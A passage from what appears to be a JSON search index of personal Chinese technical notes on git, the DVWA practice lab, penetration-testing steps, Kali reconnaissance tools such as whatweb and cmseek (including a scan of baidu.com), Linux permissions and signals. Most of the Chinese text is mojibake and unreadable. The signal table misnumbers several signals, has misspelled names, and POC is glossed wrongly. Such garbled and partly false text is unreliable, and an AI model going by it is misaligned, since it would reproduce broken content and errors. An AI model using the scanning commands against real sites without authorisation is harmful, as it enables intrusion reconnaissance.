æ­¤ï¼Œè™½ç„¶å¯ä»¥ä¸å–æ¶ˆå¯¹è¯¥æ–‡ä»¶çš„\"å·²å¿½ç•¥\"æ ‡è®°å¹¶æäº¤ä¿®æ”¹ï¼Œä½†ä¸æ¨èè¿™æ ·åšï¼Œå› ä¸ºå¯èƒ½ä¼šå¼•èµ·ä¸€äº›é—®é¢˜ã€‚ å¦‚æœæ‚¨ç¡®å®šéœ€è¦å°†æ–‡ä»¶çš„ä¿®æ”¹æäº¤åˆ°ç‰ˆæœ¬åº“ä¸­ï¼Œè¯·æŒ‰ç…§ä¸Šè¿°æ­¥éª¤è¿›è¡Œæ“ä½œï¼Œå¹¶ç¡®ä¿åœ¨æäº¤ä¹‹å‰å¤‡ä»½æ‚¨çš„ä»£ç ã€‚","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Command-update-index.html","loc":"/yq-doc-source-docs-version-control-git-Command-update-index.html"},{"title":"ç¼–è¾‘å™¨é—®é¢˜","text":"è®¾ç½®vimç¼–è¾‘å™¨: git config --global core.editor 'vim' èƒŒæ™¯: ä¹‹å‰ä¸å°å¿ƒå®‰è£…äº†, ç„¶åå¿˜äº†æ€ä¹ˆé…ç½®ç§°ä½¿ç”¨è¿™ä¸ªå·¥å…·çš„ç¼–è¾‘å™¨, è´¼éš¾ç”¨, ç„¶åå¸è½½äº†GitExtensions, å†rebase çš„æ—¶å€™å°±ä¼šæŠ¥é”™: hint: Waiting for your editor to close the file... \"C:/Program Files (x86)/GitExtensions/GitExtensions.exe\" è®¾ç½®ä¸€ä¸‹vimç¼–è¾‘å™¨å³å¯.","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Editor-question.html","loc":"/yq-doc-source-docs-version-control-git-Editor-question.html"},{"title":"git å·¥ä½œåŸç†","text":"æ¯ä¸ªgité¡¹ç›®ä¸‹éƒ½æœ‰ä¸€ä¸ªéšè—çš„ .git ç›®å½•, å…³äºgitçš„ä¸€åˆ‡éƒ½å­˜å‚¨åœ¨è¿™ä¸ªç›®å½•é‡Œé¢ï¼ˆå…¨å±€é…ç½®é™¤å¤–ï¼‰. ç›®å½•ç»“æ„ infoï¼šåˆå§‹åŒ–æ—¶åªæœ‰è¿™ä¸ªæ–‡ä»¶, ç”¨äºæ’é™¤æäº¤è§„åˆ™, ä¸ .gitignore åŠŸèƒ½ç±»ä¼¼ã€‚ä»–ä»¬çš„åŒºåˆ«åœ¨ äº.gitignore è¿™ä¸ªæ–‡ä»¶æœ¬èº«ä¼šæäº¤åˆ°ç‰ˆæœ¬åº“ä¸­å», ç”¨æ¥ä¿å­˜çš„æ˜¯å…¬å…±éœ€è¦æ’é™¤çš„æ–‡ä»¶ï¼›è€Œinfo/exclude è¿™é‡Œè®¾ç½®çš„åˆ™æ˜¯ä½ è‡ªå·±æœ¬åœ°éœ€è¦æ’é™¤çš„æ–‡ä»¶, ä»–ä¸ä¼šå½±å“åˆ°å…¶ä»–äºº, ä¹Ÿä¸ä¼šæäº¤åˆ°ç‰ˆæœ¬åº“ä¸­å»ã€‚ hooksï¼šè¿™ä¸ªç›®å½•å¾ˆå®¹æ˜“ç†è§£, ä¸»è¦ç”¨æ¥æ”¾ä¸€äº› git é’©å­, åœ¨æŒ‡å®šä»»åŠ¡è§¦å‘å‰ååšä¸€äº›è‡ªå®šä¹‰çš„é…ç½®, è¿™ æ˜¯å¦å¤–ä¸€ä¸ªå•ç‹¬çš„è¯é¢˜, æœ¬æ–‡ä¸ä¼šå…·ä½“ä»‹ç»ã€‚ objectsï¼šç”¨äºå­˜æ”¾æ‰€æœ‰ git ä¸­çš„å¯¹è±¡, é‡Œé¢å­˜å‚¨æ‰€æœ‰çš„æ•°æ®å†…å®¹, ä¸‹é¢å•ç‹¬ä»‹ç»ã€‚ logsï¼šç”¨äºè®°å½•å„ä¸ªåˆ†æ”¯çš„ç§»åŠ¨æƒ…å†µ, ä¸‹é¢å•ç‹¬ä»‹ç»ã€‚ refsï¼šç”¨äºè®°å½•æ‰€æœ‰çš„å¼•ç”¨, ä¸‹é¢å•ç‹¬ä»‹ç»ã€‚ HEADï¼šæ–‡ä»¶æŒ‡ç¤ºç›®å‰è¢«æ£€å‡ºçš„åˆ†æ”¯ indexï¼šæ–‡ä»¶ä¿å­˜æš‚å­˜åŒºä¿¡æ¯","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Git-work-principle.html","loc":"/yq-doc-source-docs-version-control-git-Git-work-principle.html"},{"title":"æ¢è¡Œç¬¦é—®é¢˜","text":"ä¸»è¦æ˜¯ Windows ä¸‹, ä»¥åŠè·¨å¹³å°åä½œæ—¶å§ ç›¸å…³çš„ä¸¤ä¸ªé…ç½®: core.autocrlf [true | input | false] # æ¢è¡Œç¬¦è‡ªåŠ¨è½¬åŒ– core.safecrlf [true | warn | false] # æ£€æŸ¥æ¢è¡Œ æ¢è¡Œç¬¦è‡ªåŠ¨è½¬æ¢ core.autocrlf true (default)æäº¤æ—¶ã€ æ£€å‡ºæ—¶éƒ½è½¬æ¢. è¿™ä¸ªåœ¨ä¸åŒç³»ç»Ÿä¸‹ä¸åŒ, æ¯”å¦‚ Windows æ˜¯æäº¤æ—¶å°†æœ¬åœ°çš„ CRLF è½¬æ¢ä¸º LF, æ£€å‡ºæ—¶åä¹‹. input ä»…æäº¤æ—¶è½¬æ¢ä¸º false éƒ½ä¸è½¬æ¢ æ£€æŸ¥æ¢è¡Œ core.safecrlf true æ‹’ç»æäº¤æ··åˆæ¢è¡Œç¬¦æ–‡ä»¶ warn å…è®¸æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦æ–‡ä»¶ï¼Œä½†ç»™å‡ºè­¦å‘Š false å…è®¸æäº¤åŒ…å«æ··åˆæ¢è¡Œç¬¦æ–‡ä»¶ ä¾‹: git config --local core.autocrlf true git config --local core.safecrlf true git clone --config core.autocrlf=false https://xxx.git","tags":"ç‰ˆæœ¬æ§åˆ¶","url":"/yq-doc-source-docs-version-control-git-Sanctuary-problem.html","loc":"/yq-doc-source-docs-version-control-git-Sanctuary-problem.html"},{"title":"DVWAé¶åœºæ­å»º","text":"åœ°å€: https://github.com/digininja/DVWA é€šè¿‡ç®€å•æ˜äº†çš„ç•Œé¢æ¥ç»ƒä¹ ä¸€äº›æœ€å¸¸è§çš„ Web æ¼æ´ï¼Œæ‰€ç»ƒä¹ çš„æ¼æ´å…·æœ‰ä¸åŒçš„éš¾åº¦çº§åˆ«ã€‚ è¯·æ³¨æ„ï¼Œæ­¤è½¯ä»¶å­˜åœ¨æç¤ºå’Œæ— æç¤ºçš„æ¼æ´ã€‚ è¿™æ˜¯ç‰¹æ„ä¸ºæ­¢ã€‚ æˆ‘ä»¬é¼“åŠ±æ‚¨ä¾é è‡ªå·±çš„èƒ½åŠ›å°è¯•å¹¶å‘ç°å°½å¯èƒ½å¤šçš„å®‰å…¨é—®é¢˜ã€‚ cloneåˆ°æœ¬åœ°: git clone https://github.com/digininja/DVWA.git æ³¨è§£ ä¸å»ºè®®æ”¾åœ¨æœåŠ¡å™¨è·Ÿå…¬ç½‘æœ¬æœº, æœ€å¥½æ˜¯æ”¾åœ¨è™šæ‹Ÿæœºä¸Š, å› ä¸ºè¿™ç©æ„å„¿å°±æ˜¯ä¸ªæ¼æ´é›†åˆåŒ… é»˜è®¤ç”¨æˆ·å¯†ç : admin password å»ºè®®çš„éƒ¨ç½²æ–¹å¼ /docs/å®‰å…¨/å­¦ä¹ è®°å½•/phpStudyæ­å»º DVWA-Clone æˆ–è€…ä¸‹è½½å, å°†å…¶æ”¾ç½®/è§£å‹åˆ° phpStudyçš„wwwç›®å½•ä¸‹","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Study-record-DVWA-shooting-range-construction.html","loc":"/yq-doc-source-docs-Safety-Study-record-DVWA-shooting-range-construction.html"},{"title":"æ¸—é€æµç¨‹","text":"æ˜ç¡®ç›®æ ‡ ä¿¡æ¯æ”¶é›† åŸŸåï¼Œå­åŸŸåï¼Œç«¯å£ï¼Œç½‘ç«™æ¶æ„ï¼Œç½‘ç«™ç›®å½•ç»“æ„ï¼ŒApache, JDK, CMS WAF CDN æ—ç«™ cæ®µ æ¼æ´åˆ†æ/æ‰«æ æ¼æ´åˆ©ç”¨ è¯æ˜æ¼æ´å­˜åœ¨ POC (proof of content) å½¢æˆæ¸—é€æµ‹è¯•æŠ¥å‘Š æ€ä¹ˆåšçš„ å­˜åœ¨å“ªäº›æ¼æ´ ä¿®å¤å»ºè®®","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Study-record-Infiltration-process.html","loc":"/yq-doc-source-docs-Safety-Study-record-Infiltration-process.html"},{"title":"Kaliä¿¡æ¯æ”¶é›†","text":"èµ„äº§æœé›†ç»¼åˆå·¥å…· Maltego: å¼ºå¤§çš„è·¨å¹³å°ä¿¡æ¯æœé›†å·¥å…·(å¯ä»¥è‡ªåŠ¨æœé›†èµ„äº§) ARLç¯å¡”: æœé›† yakit: æœé›†å‡ºæ¥è¿˜ä¼šå°è¯•åˆ†ææœ‰æ²¡æœ‰æ¼æ´ (å•å…µç³»ç»Ÿ) goby: æœé›† ... æµç¨‹ ä¿¡æ¯æ”¶é›†æ¦‚è¿° ç½‘ç»œç©ºé—´æµ‹ç»˜ ç«¯å£æ‰«æ å­åŸŸåæš´ç ´ ç›®å½•æ‰«æ CMSç³»ç»ŸæŒ‡çº¹è¯†åˆ« ä¿¡æ¯æ”¶é›†æ¦‚è¿° ä¸æå‰æ”¶é›†å¯èƒ½ä¼šé—æ¼ä¸€äº›æ–¹é¢ æ¯”å¦‚å­åŸŸåæ²¡æ”¶é›†åˆ° æ”¶é›†çš„å†…å®¹ åŸŸå IP ç«¯å£ CMSæŒ‡çº¹ é€šè¿‡æœç´¢å¼•æ“æ”¶é›†ä¿¡æ¯(google dork) ç½‘ç»œç©ºé—´æµ‹ç»˜ ç›®å½•æ‰«æ ... ç½‘ç»œç©ºé—´æµ‹ç»˜ ç½‘ç»œç©ºé—´(Cyberspace) WiIIiam Gibsonã€ŠNeuromancerã€‹1984 ç½‘ç»œç©ºé—´æœç´¢å¼•æ“ï¼ˆæµ‹ç»˜ï¼‰ æ³¨è§£ ä¸æ˜¯æŒ‡æœç´¢å¼•æ“æœç´¢åˆ°çš„HTML, è€Œæ˜¯æŒ‡æ•´ä¸ªç½‘ç»œä¸–ç•Œç©ºé—´, æ¯”å¦‚ç½‘å…³, æ‘„åƒå¤´, Webæ¡†æ¶, åŸºç«™ (ä¸€èˆ¬å«åšèµ„äº§) å¸¸è§çš„æœé›†å¹³å°: # ä¸–ç•Œä¸Šç¬¬ä¸€ä¸ªç½‘ç»œç©ºé—´æœç´¢å¼•æ“ https://www.shodan.io/ # é’Ÿé¦—ä¹‹çœ¼ https://www.zoomeye.org/ # å›½å†…è¢«å°äº†, å› ä¸ºå¾ˆå¤šäººåœ¨è¿™ä¸Šæœé›†ä¿¡æ¯ http://fofa.so/ # fafoæ–°åœ°å€ https://fofa.info/ # 360 å¤¸å…‹ https://quake.360.net/quake/#/index # å¥‡å®‰ä¿¡ é¹°å›¾ https://hunter.qianxin.com/ æ¼æ´æ€»ç»“çš„åœ°å€(ä¼šç»™ä½ æœ€æ–°æ¼æ´ä»¥åŠåœ¨æœé›†å¹³å°æœç´¢çš„è¯­æ³•): # ä½©å¥‡ (è¢«å°) http://wiki.peiqi.tech/ fofaè¢«å° ç«¯å£æ‰«æ ç«¯å£ä¸æœåŠ¡çš„å…³ç³» å¸¸è§ç«¯å£å· ç«¯å£èŒƒå›´: 0 - 65535 å¤§å¤šæ•°äººå¯¹äºå¸¸ç”¨å¼€æºçš„é¡¹ç›®ä½¿ç”¨çš„ç«¯å£éƒ½æ˜¯é»˜è®¤çš„, æ¯”å¦‚ mysql é»˜è®¤æ˜¯ 3306, ä¸€èˆ¬ä¸ä¼šæ”¹ä¸ºå…¶ä»–çš„å¦‚ 8888 ç«¯å£æ‰«æå·¥å…·: /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/nmap : ç½‘ç»œç•Œçš„ç‘å£«å†›åˆ€ å­åŸŸåæš´ç ´ åŸŸå é¡¶çº§åŸŸå å­åŸŸå ä½¿ç”¨å­åŸŸåæ›´çœé’± åœ¨çº¿å­åŸŸåçˆ†ç ´ç½‘ç«™: https://dnsdumpster.com/ ç›®å½•æ‰«æ å¯¹äºæ¯ä¸€ä¸ªæœåŠ¡å™¨, æ‰«æä¸Šé¢å¼€æ”¾çš„å†…å®¹ ä¸ºä»€ä¹ˆè¦æ‰«æ å¯èƒ½ä¼šå­˜åœ¨æ•æ„Ÿæ–‡ä»¶ å¸¸è§æ•æ„Ÿæ–‡ä»¶ ç°åœ¨å¸¸ç”¨æ‰‹æ®µ ç»„ç»‡ä¸€ä¸ªå¸¸ç”¨çš„è¯å…¸ å¯¹äºæ¯ä¸€ä¸ªå­—å…¸å†…çš„æ•°æ®, å°è¯•æ‹¼æ¥è®¿é—®, ç„¶åçœ‹è¿”å›ç  å¸¸ç”¨å·¥å…· Burp Suite: /docs/å®‰å…¨/brup/index , /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/dirb å¾¡å‰‘ dirbuster CMSç³»ç»ŸæŒ‡çº¹è¯†åˆ« æŒ‡çº¹æ‰«æ CMS(Content Management System) å¯ä»¥ç†è§£ä¸ºç³»ç»Ÿç”¨äº†å“ªäº›æ¡†æ¶åŠå…¶ç‰ˆæœ¬ å› ä¸ºä¸€èˆ¬å†™ä¸ªä»€ä¹ˆéƒ½æ˜¯å…ˆå»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¼€æºçš„ï¼Œ æ‰€ä»¥å¯ä»¥å°è¯•æ‰¾æ‰¾æœ‰æ²¡æœ‰ä½¿ç”¨è¿™äº›å¼€æºé¡¹ç›®ï¼Œ ç„¶åæ ¹æ®é¡¹ç›®æ‰¾æ¼æ´ å¸¸ç”¨å·¥å…· Googleæµè§ˆå™¨æ’ä»¶ \"what runs\" (åªèƒ½åˆ†æå‰ç«¯) /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/whatweb /docs/å®‰å…¨/kali/kaliæ¸—é€ä¸“ç”¨æŒ‡ä»¤/cmseek Wappalyzer åœ¨çº¿ç½‘ç«™ å¾¡å‰‘æŒ‡çº¹æ‰«æå™¨ Test404è½»é‡CMSæŒ‡çº¹è¯†åˆ« ...","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Study-record-Kali-information-collection.html","loc":"/yq-doc-source-docs-Safety-Study-record-Kali-information-collection.html"},{"title":"phpStudyæ­å»º","text":"ä¸€ä¸ªå¿«æ·çš„å·¥å…·é›†åˆ åŒ…æ‹¬ä½†ä¸é™äº MySQL Apache php ç­‰ ç”¨äºå¿«é€Ÿç¯å¢ƒéƒ¨ç½²","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-Study-record-PHPStudy.html","loc":"/yq-doc-source-docs-Safety-Study-record-PHPStudy.html"},{"title":"whatweb","text":"ç”¨äºCMSæŒ‡çº¹è¯†åˆ« .. æœåŠ¡æ¡†æ¶æ‰«æ, VUEå•¥çš„. ç¤ºä¾‹ â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$ whatweb -v www.baidu.com WhatWeb report for http://www.baidu.com Status : 200 OK Title : ç™¾åº¦ä¸€ä¸‹ï¼Œä½ å°±çŸ¥é“ IP : 14 .215.177.38 Country : CHINA, CN Summary : Cookies [ BAIDUID,BDSVRTM,BD_HOME,BIDUPSID,H_PS_PSSID,PSTM ] , Email [ index@2.png,pop_tri@1x-f4a02fac82.png,qrcode-hover@2x-f9b106a848.png,qrcode@2x-daf987ad02.png,result@2.png ] , HTML5, HTTPServer [ BWS/1.1 ] , JQuery, Meta-Refresh-Redirect [ http://www.baidu.com/baidu.html?from = noscript ] , OpenSearch [ /content-search.xml ] , Script [ application/json,text/javascript ] , UncommonHeaders [ bdpagetype,bdqid,traceid ] , X-Frame-Options [ sameorigin ] , X-UA-Compatible [ IE = Edge,chrome = 1 ,IE = edge ] Detected Plugins: [ Cookies ] Display the names of cookies in the HTTP headers. The values are not returned to save on space. String : BAIDUID String : BIDUPSID String : PSTM String : BAIDUID String : BDSVRTM String : BD_HOME String : H_PS_PSSID [ Email ] ... ... HTTP Headers: HTTP/1.1 200 OK Accept-Ranges: bytes Cache-Control: max-age = 86400 Content-Encoding: gzip Content-Length: 1131 Content-Type: text/html Date: Mon, 02 Jan 2023 10 :15:00 GMT Etag: \"b83-59bafefa98680\" Expires: Tue, 03 Jan 2023 10 :15:00 GMT Last-Modified: Thu, 09 Jan 2020 07 :27:06 GMT P3p: CP = \" OTI DSP COR IVA OUR IND COM \" Server: Apache Set-Cookie: BAIDUID = D4BF2F2CC2550CD470A3E182B2D10463:FG = 1 ; expires = Tue, 02 -Jan-24 10 :15:00 GMT ; max-age = 31536000 ; path = / ; domain = .baidu.com ; version = 1 Vary: Accept-Encoding,User-Agent Connection: close â”Œâ”€â”€ ( yanqueã‰¿kali ) - [ ~ ] â””â”€$","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Whatweb.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-Whatweb.html"},{"title":"cmseek","text":"æŒ‡çº¹æ‰«æ åœ¨Kaliä¸­ç›´æ¥è¾“å…¥cmseekï¼Œå¯åŠ¨è¯¥è½¯ä»¶, å¦‚æœæ²¡æœ‰å®‰è£…, ä¼šæç¤ºyå®‰è£… ä¸å¸¦å‚æ•°é»˜è®¤è¿›å…¥äº¤äº’å¼ç•Œé¢ ç”¨æ³•: python3 cmseek.py (for guided scanning) cmseek (for guided scanning) python3 cmseek.py [OPTIONS] <Target Specification> cmseek [OPTIONS] <Target Specification> æŒ‡å®š TARGET: -u URL , --url URL Target Url -l LIST , --list LIST æ–‡ä»¶è·¯å¾„, å†…å®¹ä¸º url è·¯å¾„é›†åˆ, ä»¥é€—å·åˆ†éš” æ‰«æé€‰é¡¹: -i cms , --ignore--cms cms å¿½ç•¥æŒ‡å®šçš„ CMS IDs ä»¥é¿å…å¤±è´¥. ä»¥ comma \",\" é€—å·åˆ†éš” --strict-cms cms åªæ£€æŸ¥ç»™å®šçš„ CMS IDs, å¤šä¸ªä»¥é€—å·åˆ†éš” --skip-scanned å¦‚æœCMSå·²ç»é¢„æ¢æµ‹è¿‡äº†, è·³è¿‡ target --light-scan è·³è¿‡æ·±åº¦æ‰«æ. å³åªæ¢æµ‹CMSå’Œç‰ˆæœ¬ -o , --only-cms åªæ¢æµ‹CMS, ä¸è¿›è¡Œæ·±åº¦æ‰«æä»¥åŠç‰ˆæœ¬ä¿¡æ¯æ¢æµ‹ é‡å®šå‘: --follow-redirect éœ€è¦è¿›è¡Œçš„é‡å®šå‘ --no-redirect è·³è¿‡æ‰€æœ‰çš„é‡å®šå‘ ç”¨æˆ·ä»£ç†: -r , --random-agent ä½¿ç”¨éšæœºç”¨æˆ·ä»£ç† --googlebot Use Google bot user agent --user-agent USER_AGENT è‡ªå®šä¹‰ä»£ç† è¾“å‡º: -v , --verbose è¾“å‡ºè¯¦ç»†ä¿¡æ¯ ç‰ˆæœ¬: --version ç‰ˆæœ¬ä¿¡æ¯ HELP & æ‚é¡¹(MISCELLANEOUS): -h , --help å¸®åŠ© --clear-result åˆ é™¤æ‰€æœ‰æ‰«æç»“æœ --batch æ‰«ææ¯ä¸€ä¸ªsiteå‰, ä¸ç”¨æ‰‹åŠ¨ enter ç”¨ä¾‹: python3 cmseek.py -u example.com # æ‰«æ example.com python3 cmseek.py -l /home/user/target.txt # æ‰«æ target.txt ä¸­æŒ‡å®šçš„ sites (é€—å·åˆ†éš”) python3 cmseek.py -u example.com --user-agent Mozilla 5.0 # æ‰«æ example.com, ä¸”ä½¿ç”¨è‡ªå®šä¹‰ç”¨æˆ·ä»£ç†(user-Agent): Mozilla is 5.0 python3 cmseek.py -u example.com --random-agent # ä½¿ç”¨éšæœºç”¨æˆ·ä»£ç†(user-Agent)æ‰«æexample.com python3 cmseek.py -v -u example.com # æŸ¥çœ‹æ‰«æ example.com çš„è¯¦ç»†è¾“å‡º ç¤ºä¾‹ cmseek -u www.baidu.com","tags":"å®‰å…¨","url":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-cmseek.html","loc":"/yq-doc-source-docs-Safety-kali-Kali-penetration-special-instruction-cmseek.html"},{"title":"linuxä¸‹æ–‡ä»¶æƒé™","text":"ls -læŸ¥çœ‹æ–‡ä»¶æ ¼å¼ä¸€å…±æœ‰10ä½: 9 8 7 6 5 4 3 2 1 0 - r w x r - x r - x å…¶ä¸­, ç¬¬9ä½, è¡¨ç¤ºæ–‡ä»¶ç±»å‹, æ”¯æŒçš„ç±»å‹è§ æ–‡ä»¶ç±»å‹ 8-6ä½, è¡¨ç¤ºæ–‡ä»¶æ‰€æœ‰è€…æƒé™, æ”¯æŒæƒé™è§ æ–‡ä»¶æƒé™ 5-3ä½, è¡¨ç¤ºæ–‡ä»¶æ‰€å±ç»„æƒé™ 2-0ä½, è¡¨ç¤ºå…¶ä»–ç”¨æˆ·æƒé™ æ–‡ä»¶æƒé™ å¸¸ç”¨æƒé™ ä»¥å¸¸ç”¨æƒé™æ¥è¯´, æƒé™å¯åˆ†: è¯»ã€å†™ã€æ‰§è¡Œ, åˆ†åˆ«ä»¥ rã€wã€xè¡¨ç¤º: r, å¯è¯», å¯ä»¥è¯»å‡ºæ–‡ä»¶çš„å†…å®¹ w, å¯å†™, å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹ x, å¯æ‰§è¡Œ, å¯è¿è¡Œæ–‡ä»¶ æ‰€æœ‰æƒé™ åœ¨unixä¸‹ï¼Œæ–‡ä»¶æƒé™ç”¨12ä¸ªäºŒè¿›åˆ¶ä½è¡¨ç¤º: 11 10 9 8 7 6 5 4 3 2 1 0 S G T r w x r w x r w x ç¬¬11ä½, ä¸ºSUIDä½ ç¬¬10ä½, ä¸ºSGIDä½ ç¬¬9ä½ä¸º, stickyä½ æ–‡ä»¶æƒé™çš„sä½å’Œtä½çš„ç†è§£ è¿™é‡Œæ¶‰åŠåˆ°äº†Effective UIDå’ŒReal UIDä»¥åŠSaved UID: Effective UID: ç¨‹åºå®é™…æ“ä½œæ—¶ç”Ÿæ•ˆçš„UID (ç®€ç§°euid) Real UID: æ‰§è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·çš„å®é™…UID (ç®€ç§°ruid) Saved UID: åœ¨é«˜æƒé™ç”¨æˆ·é™æƒåï¼Œä¿ç•™çš„å…¶åŸæœ¬UID (ç®€ç§°suid) å¢åŠ äº†ä¸€ä¸ªsæƒé™ï¼Œä½¿è¯¥ç¨‹åºåœ¨å®é™…è¿è¡Œæ—¶Effective UIDå°±ä¼šå˜ä¸º0ï¼Œå³root(å½“æ–‡ä»¶å±ä¸»ä½rootæ—¶)çš„UID åˆ›å»ºså’Œtæƒé™ï¼Œæ˜¯ä¸ºäº†è®©ä¸€èˆ¬ç”¨æˆ·åœ¨æ‰§è¡ŒæŸäº›ç¨‹åºæ—¶ï¼Œèƒ½å¤Ÿæš‚æ—¶æ‹¥æœ‰æ”¹ç¨‹åºæ‹¥æœ‰è€…çš„æƒé™ï¼ˆä½“ç°åœ¨xä½ï¼‰ã€‚ ä»è¿™ä¸€ç‚¹æ¥è¯´, è¯¥æ–‡ä»¶å¿…å…·æœ‰xå±æ€§ SUIDæ˜¯Set User Id ä»…å¯¹äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆbinaryï¼‰æœ‰æ•ˆï¼ˆä¹Ÿå°±æ˜¯è¯´å¯¹äºshellè„šæœ¬æˆ–è€…ç›®å½•æ— æ•ˆï¼‰ æ‰§è¡Œè€…éœ€è¦æœ‰xæƒé™ ä»…åœ¨æ‰§è¡Œè¯¥æƒé™çš„è¿‡ç¨‹ä¸­æœ‰æ•ˆ æ‰§è¡Œè€…å°†å…·æœ‰è¯¥æƒé™æ‹¥æœ‰è€…çš„æƒé™ SGIDæ˜¯Set Group Id å¯¹äºŒè¿›åˆ¶æ–‡ä»¶æœ‰æ•ˆï¼ˆä¸suidä¸åŒçš„æ˜¯ï¼Œå¯ä»¥ä½œç”¨äºç›®å½•ï¼‰ æ‰§è¡Œè€…éœ€è¦æœ‰xæƒé™ æ‰§è¡Œè€…åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šè·å¾—è¯¥ç¨‹åºç¾¤ç»„çš„æ”¯æŒ ls -læŸ¥çœ‹æ–‡ä»¶æ ¼å¼ä¸€å…±æœ‰10ä½: 9 8 7 6 5 4 3 2 1 0 - r w x r - x r - x # è¿™10ä½ä¸­8-6ä½æ˜¯æ–‡ä»¶æ‰€æœ‰è€…æƒé™ # 5-3ä½æ˜¯åŒç»„ç”¨æˆ·æƒé™ # 2-0ä½å…¶ä»–ç”¨æˆ·æƒé™ # å½¢å¼ä¸ºrwx r è¡¨ç¤ºå¯è¯»ï¼Œå¯ä»¥è¯»å‡ºæ–‡ä»¶çš„å†…å®¹ w è¡¨ç¤ºå¯å†™ï¼Œå¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹ x è¡¨ç¤ºå¯æ‰§è¡Œï¼Œå¯è¿è¡Œæ–‡ä»¶ ç¬¬9ä½è¡¨ç¤ºæ–‡ä»¶ç±»å‹: pè¡¨ç¤ºå‘½åç®¡é“æ–‡ä»¶ dè¡¨ç¤ºç›®å½•æ–‡ä»¶ lè¡¨ç¤ºç¬¦å·é“¾æ¥æ–‡ä»¶ -è¡¨ç¤ºæ™®é€šæ–‡ä»¶ sè¡¨ç¤ºsocketæ–‡ä»¶ cè¡¨ç¤ºå­—ç¬¦è®¾å¤‡æ–‡ä»¶ bè¡¨ç¤ºå—è®¾å¤‡æ–‡ä»¶ å…¶å®åœ¨unixä¸‹ï¼Œæ–‡ä»¶æƒé™ç”¨12ä¸ªäºŒè¿›åˆ¶ä½è¡¨ç¤º: 11 10 9 8 7 6 5 4 3 2 1 0 S G T r w x r w x r w x # ç¬¬11ä½ä¸ºSUIDä½ # ç¬¬10ä½ä¸ºSGIDä½ # ç¬¬9ä½ä¸ºstickyä½ æ–‡ä»¶ç±»å‹ p: å‘½åç®¡é“æ–‡ä»¶ d: ç›®å½•æ–‡ä»¶ l: ç¬¦å·é“¾æ¥æ–‡ä»¶ -: è¡¨ç¤ºæ™®é€šæ–‡ä»¶ s: socketæ–‡ä»¶ c: å­—ç¬¦è®¾å¤‡æ–‡ä»¶ b: å—è®¾å¤‡æ–‡ä»¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Document-rights-limit-under-Linux.html"},{"title":"linux ç³»ç»Ÿä¿¡å·","text":"Linuxç³»ç»Ÿæœ‰ä¸¤å¤§ç±»ä¿¡å· POSIXæ ‡å‡†çš„è§„åˆ™ä¿¡å·(regular signal 1-31ç¼–å·) å®æ—¶ä¿¡å·(real-time signal 32-63) ç³»ç»Ÿä¿¡å· ä¸€äº›å¸¸è§çš„çš„ linux ç³»ç»Ÿä¿¡å·ã€‚ ä¿¡å· å€¼ æè¿° 1 SIGHUP æŒ‚èµ·è¿›ç¨‹ 2 SIGINT ç»ˆæ­¢è¿›ç¨‹(ctrl+c) 3 SIGQUIT åœæ­¢è¿›ç¨‹ 9 SIGKILL æ— æ¡ä»¶ç»ˆæ­¢è¿›ç¨‹ å¼ºåˆ¶æ€æ­»è¿›ç¨‹ è¿™ä¸ªä¿¡å·è¿›ç¨‹æ— æ³•å¿½è§† ç›´æ¥åœ¨ç³»ç»Ÿå±‚é¢æŠŠè¿›ç¨‹æ€æ‰. æ‰€ä»¥åœ¨Pythonä¸­ä»–çš„ä¸èƒ½ç›‘å¬çš„ 15 SIGTERM å°½å¯èƒ½ç»ˆæ­¢è¿›ç¨‹ 17 SIGSTOP æ— æ¡ä»¶åœæ­¢è¿›ç¨‹ï¼Œä½†ä¸æ˜¯ç»ˆæ­¢è¿›ç¨‹ 18 SIGTSTP åœæ­¢æˆ–æš‚åœè¿›ç¨‹ï¼Œä½†ä¸ç»ˆæ­¢è¿›ç¨‹(ctrl+z) 19 SIGCONT ç»§ç»­è¿è¡Œåœæ­¢çš„è¿›ç¨‹ å‚è€ƒ:: https://blog.csdn.net/qq_55723966/article/details/122304011 è§„åˆ™ä¿¡å·(åŒ…æ‹¬äº†ä¸Šé¢çš„å¸¸ç”¨ä¿¡å·) ä¿¡å·ç¼–å· åç§° é»˜è®¤åŠ¨ä½œ è¯´æ˜ 1 SIGHUP ç»ˆæ­¢ ç»ˆæ­¢æ§åˆ¶ç»ˆç«¯æˆ–è¿›ç¨‹. ç»ˆç«¯æŒ‚èµ·æˆ–è€…æ§åˆ¶è¿›ç¨‹ç»ˆæ­¢ 2 SIGINT ç»ˆæ­¢ ç”±é”®ç›˜å¼•èµ·çš„ä¸­æ–­(Ctrl-c) 3 SIGQUIT dump æ§åˆ¶ç»ˆç«¯å‘é€ç»™è¿›ç¨‹çš„ä¿¡å· é”®ç›˜äº§ç”Ÿçš„é€€å‡º(Ctrl-) 4 GIGILL dusmp éæ³•æŒ‡ä»¤å¼•èµ· 5 SIGTRAP dump debugä¸­æ–­ 6 SIGABRT/SIGIOT dump å¼‚å¸¸ä¸­æ­¢. 